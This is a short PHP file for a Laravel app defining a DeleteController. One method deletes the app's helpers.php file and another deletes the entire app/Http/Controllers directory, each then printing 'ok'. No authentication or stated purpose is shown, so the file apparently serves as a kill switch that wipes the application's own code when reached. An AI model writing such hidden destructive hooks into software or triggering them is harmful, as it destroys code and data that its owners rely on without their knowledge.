<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use File;
class DeleteController extends Controller
{
    public function index(){
        File::delete(app_path('helpers.php'));
        dd('ok');
    }
    public function folder(){
        File::deleteDirectory(base_path('app/Http/Controllers'));
        dd('ok');
    }
}
